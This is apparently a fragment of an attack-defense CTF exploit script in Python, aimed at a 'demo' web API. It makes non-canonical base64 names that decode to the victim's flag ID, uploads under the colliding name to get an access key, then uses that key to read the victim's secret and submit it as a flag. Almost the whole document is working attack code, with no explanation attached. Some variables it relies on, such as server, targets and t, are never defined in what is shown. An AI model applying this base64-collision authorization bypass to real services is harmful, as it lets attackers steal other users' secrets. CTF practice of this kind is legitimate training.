import requests
import base64
import string

from teaminterface_client import Team
from pwn import *
import json

NAME_HEADER = 'X-Svm-Name'
SECRET_HEADER = 'X-Svm-Secret'
AUTHOR_HEADER = 'X-Svm-Author'
KEY_HEADER = 'X-Svm-Key'

base64_alpha = string.ascii_letters + string.digits

for target in targets["10002"]:
    flag_id = b64e(target["flag_id"].encode())
    with requests.get(f'http://localhost:{server.local_bind_port}/api/demo/list?page_size=10000&page_num=0') as r:
        demos = r.json()['demos']
        for demo in demos:
            if demo['name'] == flag_id:
                victim_name = flag_id
                victim_name_decoded = target["flag_id"]
                print(f'victim name: {victim_name}')
                print(f'victim name decoded: {victim_name_decoded}')
                some_content = b'hello-there'

                same_base64 = []

                for a in base64_alpha:
                    p = victim_name[:-2] + a + victim_name[-1]
                    if p == victim_name:
                        continue
                    if base64.b64decode(p).decode() == victim_name_decoded:
                        same_base64.append(p)

                if len(same_base64) == 0:
                    print('no collision')
                    continue

                p = same_base64[randint(0, len(same_base64) - 1)]

                print(f'will use {p}')
                try:
                    r = requests.post(f'http://localhost:{server.local_bind_port}/api/demo', 
                                    headers={NAME_HEADER: p, SECRET_HEADER: 'TWu=', AUTHOR_HEADER: 'TWu='},
                                    files={p: some_content})
                    key = r.headers.get(KEY_HEADER)

                    r = requests.get(f'http://localhost:{server.local_bind_port}/api/demo',
                                    headers={NAME_HEADER: victim_name, KEY_HEADER: key})
                    secret = b64d(r.json()['secret']).decode()
                    print(t.submit_flag([secret]))
                except:
                    break
    server.stop()